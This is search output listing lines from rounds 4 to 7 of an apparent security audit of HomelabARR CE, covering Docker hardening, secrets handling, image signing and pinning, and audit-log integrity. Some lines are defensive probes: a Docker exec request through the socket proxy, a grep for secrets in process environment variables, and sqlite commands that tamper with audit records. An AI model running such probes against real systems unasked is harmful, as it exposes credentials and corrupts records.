| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 79 | `    - homelabarr-data:/app/data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 80 | `    - homelabarr-config:/app/server/config` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 81 | `    - homelabarr-activity:/app/server/activity-data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 103 | `\| '/homelabarr' bind mount RW \| YES (':rw') \| Backend can also rewrite the CLI it executes \|` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 107 | `Already does the right things image-side: 'USER homelabarr' (uid 1001), 'apk upgrade --no-cache' for current Alpine CVEs` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 127 | `\| Cosign keyless signature \| **NO** \| No 'cosign sign' step; consumers cannot 'cosign verify --certificate-identity=.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 135 | `GET https://ce-demo.homelabarr.com/  → 200, served via Traefik ('server: nginx' proxy)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 136 | `GET https://ce-demo.homelabarr.com/api/health  → 200` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 149 | `**Where:** 'homelabarr.yml' → 'backend.volumes' line '- /var/run/docker.sock:/var/run/docker.sock:rw' + 'backend.group` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 155 | `**WRONG — current 'homelabarr.yml' backend service**` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 172 | `    container_name: homelabarr-socket-proxy` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 216 | `      - homelabarr-internal` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 217 | `    # NOT on the public 'homelabarr' net — only backend can reach it` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 225 | `    image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 232 | `      - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:ro   # was :rw — see H-R4-3` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 233 | `      - homelabarr-data:/app/data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 234 | `      - homelabarr-config:/app/server/config` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 235 | `      - homelabarr-activity:/app/server/activity-data` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 238 | `      - homelabarr           # public-facing (Traefik)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 239 | `      - homelabarr-internal  # talks to socket-proxy` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 245 | `  homelabarr:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 246 | `    name: homelabarr` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 248 | `  homelabarr-internal:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 249 | `    name: homelabarr-internal` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 271 | `docker exec homelabarr-backend wget -qO- -S \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 273 | `  http://socket-proxy:2375/v1.41/containers/homelabarr-backend/exec` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 277 | `docker exec homelabarr-backend wget -qO- -S \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 282 | `docker exec homelabarr-backend wget -qO- \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 287 | `docker exec homelabarr-backend ls -la /var/run/docker.sock 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 293 | `**Where:** 'homelabarr.yml' → 'backend' service block` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 302 | `  image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 309 | `  image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 335 | `> **Note on 'read_only: true' + persistent state:** The three named volumes ('homelabarr-data', 'homelabarr-config', 'ho` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 339 | `docker inspect homelabarr-backend --format '{{ .HostConfig.ReadonlyRootfs }} {{ .HostConfig.SecurityOpt }} {{ .HostConfi` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 342 | `docker exec homelabarr-backend sh -c 'touch /etc/marker 2>&1; echo rc=$?'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 345 | `docker exec homelabarr-backend sh -c 'cat /proc/self/status \| grep CapEff'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 351 | `### H-R4-3 — Backend has read-write bind mount to host '/opt/homelabarr' (CLI bridge)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 353 | `**Where:** 'homelabarr.yml' → 'backend.volumes' line '${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:rw'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 355 | `**What:** The backend can rewrite any file under the host's HomelabARR installation directory, including the CLI scripts` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 359 | `- ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:rw` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 366 | `  - ${CLI_BRIDGE_HOST_PATH:-/opt/homelabarr}:/homelabarr:ro` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 368 | `  - ${CLI_BRIDGE_WORKDIR:-/var/lib/homelabarr/work}:/homelabarr/work:rw` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 371 | `If the CLI cannot tolerate '/homelabarr' being read-only, list the specific subdirectories that require writes and mount` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 413 | `And in 'homelabarr.yml' frontend service block:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 431 | `docker exec homelabarr-frontend id` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 434 | `docker exec homelabarr-frontend sh -c 'touch /etc/marker 2>&1; echo rc=$?'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 440 | `**Where:** 'homelabarr.yml' line '- JWT_EXPIRES_IN=${JWT_EXPIRES_IN:-24h}'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 462 | `**Where:** 'homelabarr.yml' line '- DEFAULT_ADMIN_PASSWORD=${DEFAULT_ADMIN_PASSWORD:-admin}'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 503 | `**Where:** 'homelabarr.yml' line '- JWT_SECRET=${JWT_SECRET:-CHANGE-THIS-TO-A-SECURE-SECRET}'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 541 | `          image-ref: ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 564 | `            ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 570 | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 572 | `  ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 579 | `**Where:** 'homelabarr.yml' — 'image: ghcr.io/imogenlabs/homelabarr-frontend:latest' and similarly for backend` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 585 | `image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 590 | `image: ghcr.io/imogenlabs/homelabarr-frontend:v1.2.3@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 593 | `Provide a release script that bumps the digest pins in 'homelabarr.yml' whenever a new tagged release is published, and ` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 599 | `**Where:** 'homelabarr.yml' — all three services (frontend, backend, and the proxy from C-R4-1)` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 645 | `**Where:** 'homelabarr.yml' — both 'frontend' and 'backend' services` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 699 | `**What:** A user who follows the README quickstart never learns they should 'cosign verify' images, override 'JWT_SECRET` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 710 | `      --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 712 | `      ghcr.io/imogenlabs/homelabarr-backend:<version>` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 721 | `- [ ] 'docker inspect homelabarr-backend' shows 'ReadonlyRootfs: true' and 'CapDrop: [ALL]'.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 733 | `docker exec homelabarr-backend ls -la /var/run/docker.sock 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 736 | `docker inspect homelabarr-backend --format '{{ range .Mounts }}{{ .Source }} -> {{ .Destination }} ({{ .Mode }}){{ "\n" ` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 744 | `docker exec homelabarr-backend wget -qO- -S --post-data='{"Cmd":["id"]}' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 745 | `  http://socket-proxy:2375/v1.41/containers/homelabarr-backend/exec 2>&1 \| head -5` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 749 | `docker exec homelabarr-backend wget -qO- -S \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 754 | `docker exec homelabarr-backend wget -qO- \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 762 | `docker inspect homelabarr-backend --format '{{ .HostConfig.ReadonlyRootfs }} \| {{ .HostConfig.SecurityOpt }} \| {{ .Hos` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 765 | `docker exec homelabarr-backend sh -c 'touch /etc/marker; echo rc=$?' 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 768 | `docker exec homelabarr-backend sh -c 'awk "/^CapEff/ {print \$2}" /proc/self/status'` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 775 | `docker exec homelabarr-frontend id` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 778 | `docker exec homelabarr-frontend sh -c 'touch /etc/marker; echo rc=$?' 2>&1` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 787 | `docker compose -f homelabarr.yml up -d backend 2>&1 \| head -5` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 794 | `grep -E 'image:.*@sha256:' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 798 | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 800 | `  ghcr.io/imogenlabs/homelabarr-backend:<tag>` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 807 | `# Logged-in browser session (DevTools console on ce-demo.homelabarr.com):` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 893 | `M-R4-9  Pin all images in homelabarr.yml by tag@sha256:digest.` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 921 | `When R4 ships, I will re-verify against 'ce-demo.homelabarr.com' with cache-busting:` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 922 | `- 'docker inspect' on 'homelabarr-backend' and 'homelabarr-frontend' (via your relay if you want me to script it),` |
| `docs/audit/homelabarr-ce-security-audit-round-4.md` | 924 | `- 'grep '@sha256:' homelabarr.yml' shows three pinned digests,` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-4-container-hardening@15812e2b' (live: ce-demo.homelabarr.com` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 12 | `### Round 4 verification matrix (against 'homelabarr.yml' @ 'security/round-4-container-hardening' + live probes)` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 39 | `**R4.5-drift-1** — 'homelabarr.yml' still has '- DEFAULT_ADMIN_PASSWORD=${DEFAULT_ADMIN_PASSWORD:-admin}'. Should be '` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 48 | `**R4.5-drift-2** — Images in 'homelabarr.yml' still reference ':latest' for the HomelabARR-published frontend and back` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 95 | `name: homelabarr            version: 2.2.0            type: module` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 274 | `          for img in homelabarr-frontend homelabarr-backend; do` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 281 | `          image-ref: ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 315 | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 317 | `  ghcr.io/imogenlabs/homelabarr-backend@sha256:<digest-from-latest-build>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 321 | `gh api repos/smashingtags/homelabarr-ce/code-scanning/alerts?tool_name=trivy-image-backend \| jq 'length'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 343 | `  "name": "homelabarr",` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 355 | `  "name": "homelabarr",` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 391 | `**Where:** 'homelabarr.yml' lines 'image: ghcr.io/imogenlabs/homelabarr-frontend:latest' and 'image: ghcr.io/imogenlabs/` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 398 | `  image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 400 | `  image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 406 | `  # docker buildx imagetools inspect ghcr.io/imogenlabs/homelabarr-frontend:v2.2.0 --format '{{json .Manifest.Digest}}'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 407 | `  image: ghcr.io/imogenlabs/homelabarr-frontend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 409 | `  image: ghcr.io/imogenlabs/homelabarr-backend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 418 | `for img in homelabarr-frontend homelabarr-backend; do` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 420 | `  # in-place rewrite of homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 423 | `    homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 425 | `rm -f homelabarr.yml.bak` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 428 | `echo "  cosign verify --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \\"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 430 | `echo "    ghcr.io/imogenlabs/homelabarr-backend:$TAG"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 438 | `grep -E 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 442 | `grep -E 'image:.*homelabarr-(frontend\|backend):latest($\|[[:space:]])' homelabarr.yml \| wc -l` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 534 | `title = "homelabarr-ce gitleaks config"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 540 | `id = "homelabarr-jwt-secret"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 546 | `id = "homelabarr-admin-password"` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 618 | `          image: ghcr.io/${{ github.repository_owner }}/homelabarr-backend@${{ steps.build.outputs.digest }}` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 677 | `[![OpenSSF Scorecard](https://api.securityscorecards.dev/projects/github.com/imogenlabs/homelabarr-ce/badge)](https://se` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 683 | `curl -fsS 'https://api.securityscorecards.dev/projects/github.com/imogenlabs/homelabarr-ce' \| jq '.score'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 770 | `            --excludePackages 'homelabarr@2.2.0' \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 818 | `      --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \\` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 820 | `      ghcr.io/imogenlabs/homelabarr-backend:<tag>` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 825 | `      ghcr.io/imogenlabs/homelabarr-backend:<tag> --format '{{ json .SBOM.SPDX }}' \\` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 851 | `LATEST=$(gh api repos/smashingtags/homelabarr-ce/packages/container/homelabarr-backend/versions \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 854 | `  --certificate-identity-regexp '^https://github.com/imogenlabs/homelabarr-ce/' \` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 856 | `  ghcr.io/imogenlabs/homelabarr-backend:$LATEST` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 860 | `### 4.3 — Image digest pin honored in 'homelabarr.yml'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 863 | `grep -cE 'ghcr.io/imogenlabs/homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 866 | `grep -cE 'image:.*homelabarr-(frontend\|backend):latest($\|[[:space:]])' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 904 | `curl -fsS 'https://api.securityscorecards.dev/projects/github.com/imogenlabs/homelabarr-ce' \| jq '{score, checks:[.chec` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 911 | `grep -E 'DEFAULT_ADMIN_PASSWORD=\$\{DEFAULT_ADMIN_PASSWORD:\?' homelabarr.yml` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 915 | `curl -fsS https://ce-demo.homelabarr.com/api/health \| jq '.status, .environment.validation.warnings'` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 928 | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline run against ce-demo.homelabarr.com on every merge t` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 941 | `   - **Manual review:** every dependency bump (any range) and any change touching 'server/auth.js', 'server/index.js', o` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 946 | `5. **Run the 'bump-image-digests.sh' script as part of the release ritual** and commit the resulting 'homelabarr.yml' di` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 979 | `H-R5-3   Pin both HomelabARR-published images in homelabarr.yml by` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1017 | `  R4.5-drift-1  DEFAULT_ADMIN_PASSWORD=${VAR:?...} fail-loud in homelabarr.yml.` |
| `docs/audit/homelabarr-ce-security-audit-round-5.md` | 1032 | `- 'homelabarr.yml' shows 2 'tag@sha256:digest' pins, zero ':latest' for HomelabARR-published images.` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-5-supply-chain@34bd4138' (live: ce-demo.homelabarr.com, bundl` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 45 | `# homelabarr.yml — line: DEFAULT_ADMIN_PASSWORD` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 53 | `# homelabarr.yml — image lines (replace BOTH services)` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 55 | `image: ghcr.io/imogenlabs/homelabarr-frontend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 56 | `image: ghcr.io/imogenlabs/homelabarr-backend:latest` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 58 | `image: ghcr.io/imogenlabs/homelabarr-frontend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 59 | `image: ghcr.io/imogenlabs/homelabarr-backend:v2.2.0@sha256:<64hex>` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 343 | `  --data '{"username":"admin","passcode":"WRONG"}' https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 346 | `  https://ce-demo.homelabarr.com/api/audit?limit=5 \| jq '.events[0] \| {event, result, ip}'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 350 | `sqlite3 /app/data/homelabarr.db "UPDATE audit_events SET result='ok' WHERE id=1;"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 482 | `    https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 516 | `  const body = JSON.stringify({ ...payload, source: 'homelabarr-ce' });` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 578 | `  defaultMeta: { service: 'homelabarr-backend', version: process.env.APP_VERSION \|\| 'dev' },` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 611 | `curl -sI https://ce-demo.homelabarr.com/api/health \| tr -d '\r' \| grep -i '^x-request-id:'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 615 | `docker logs --tail 5 homelabarr-backend 2>&1 \| head -1 \| jq -r .level` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 619 | `docker logs --tail 100 homelabarr-backend 2>&1 \| grep -iE 'passcode\|password\|jwt_secret' \| grep -v 'REDACTED' \| hea` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 655 | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 660 | `  https://ce-demo.homelabarr.com/api/health/detail \| jq '.platform.nodeVersion'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 826 | `   sqlite3 /app/data/homelabarr.db "DELETE FROM sessions; DELETE FROM rate_buckets;"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 869 | `  --data '{"username":"admin","passcode":"WRONG"}' https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 875 | `  https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 878 | `  https://ce-demo.homelabarr.com/api/audit?limit=10 \| jq '{chain, last:.events[0]}'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 888 | `    https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 895 | `  https://ce-demo.homelabarr.com/api/auth/login` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 906 | `curl -s https://ce-demo.homelabarr.com/api/health \| jq 'keys'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 914 | `curl -sI -H "X-Request-Id: $RID" https://ce-demo.homelabarr.com/api/health \| grep -i x-request-id` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 917 | `docker logs --tail 200 homelabarr-backend 2>&1 \| jq -c "select(.rid==\"$RID\")"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 925 | `sqlite3 /app/data/homelabarr.db "UPDATE audit_events SET result='ok' WHERE id=(SELECT MIN(id) FROM audit_events);"` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 927 | `  https://ce-demo.homelabarr.com/api/audit \| jq '.chain'` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 934 | `grep -c 'DEFAULT_ADMIN_PASSWORD=\$\{DEFAULT_ADMIN_PASSWORD:\?' homelabarr.yml   # expect 1` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 935 | `grep -cE 'homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml  # expect 2` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 941 | `curl -s https://ce-demo.homelabarr.com/api/health \| jq -r .status                    # expect OK` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 952 | `\| **R9** \| Application-layer DAST — automated OWASP ZAP baseline against ce-demo.homelabarr.com on each main-branch ` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1042 | `  R5.5-drift-6  Image digest pinning in homelabarr.yml (requires` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1060 | `- Every API response carries 'X-Request-Id'; 'docker logs homelabarr-backend' lines are valid JSON containing the same r` |
| `docs/audit/homelabarr-ce-security-audit-round-6.md` | 1064 | `- 'grep -cE 'homelabarr-(frontend\|backend):[^@]+@sha256:[a-f0-9]{64}' homelabarr.yml' returns 2.` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 3 | `**Target:** 'smashingtags/homelabarr-ce' @ 'security/round-6-observability@5807987e' (live: ce-demo.homelabarr.com)` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 67 | `'homelabarr.yml' backend service environment block lists at minimum:` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 87 | `\| 'homelabarr-data' \| SQLite DB '/app/data/homelabarr.db' (users, sessions, account_lockouts, rate_buckets, audit_even` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 88 | `\| 'homelabarr-config' \| '/app/server/config' — users.json (R0 legacy?), api keys, session state \| HIGH \|` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 89 | `\| 'homelabarr-activity' \| '/app/server/activity-data' — rotated 'audit-*.jsonl.gz' (R6 M-R6-6) \| HIGH — login IPs` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 98 | `\| SQLCipher key (new) \| Encrypts 'homelabarr.db' at rest \| 180 days \|` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 131 | `**Where:** 'homelabarr.yml' backend service 'environment:' block; 'server/auth.js' reading 'process.env.JWT_SECRET'; 'se` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 136 | `docker inspect homelabarr-backend --format '{{ range .Config.Env }}{{ println . }}{{ end }}'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 203 | `**Compose changes — 'homelabarr.yml':**` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 268 | `docker inspect homelabarr-backend --format '{{ range .Config.Env }}{{ println . }}{{ end }}' \` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 273 | `docker exec homelabarr-backend ls -la /run/secrets/` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 277 | `curl -s -o /dev/null -w '%{http_code}\n' https://ce-demo.homelabarr.com/api/health` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 281 | `docker exec homelabarr-backend sh -c 'tr "\0" "\n" < /proc/1/environ \| grep -iE "jwt\|secret\|password"'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 285 | `### C-R7-2 — 'homelabarr.db' SQLite database is cleartext on disk` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 287 | `**Where:** '/app/data/homelabarr.db' inside the backend, persisted via the 'homelabarr-data' Docker volume (host path un` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 301 | `export const db = new Database('/app/data/homelabarr.db');` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 309 | `const DB_PATH = process.env.DB_PATH \|\| '/app/data/homelabarr.db';` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 333 | `DB_PATH="${1:?usage: $0 <path/to/homelabarr.db>}"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 364 | `docker exec homelabarr-backend sh -c 'head -c 16 /app/data/homelabarr.db \| xxd'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 369 | `  https://ce-demo.homelabarr.com/api/auth/sessions \| jq 'length'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 373 | `docker exec homelabarr-backend sh -c \` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 374 | `  'sqlite3 /app/data/homelabarr.db "SELECT 1;"' 2>&1 \| head -5` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 379 | `  https://ce-demo.homelabarr.com/api/audit \| jq '.chain.ok'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 473 | `  https://ce-demo.homelabarr.com/api/auth/me \| jq -r '.username'` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 493 | `DB_PATH="${DB_PATH:-/var/lib/docker/volumes/homelabarr-data/_data/homelabarr.db}"` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 521 | `docker exec homelabarr-backend node -e "const db=require('./server/db.js').db; console.log(db.prepare('SELECT count(*) c` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 528 | `docker exec homelabarr-backend ls -la /run/secrets/sqlcipher_key` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 529 | `docker exec homelabarr-backend node -e "..." # same query, same N` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 567 | `**Where:** 'homelabarr-config' volume mounted at '/app/server/config' (per R4 §2.1). If that path contains any JSON fil` |
| `docs/audit/homelabarr-ce-security-audit-round-7.md` | 598 | `Until the kv_secrets migration in R7 H-R7-6 is complete, the homelabarr-config` |
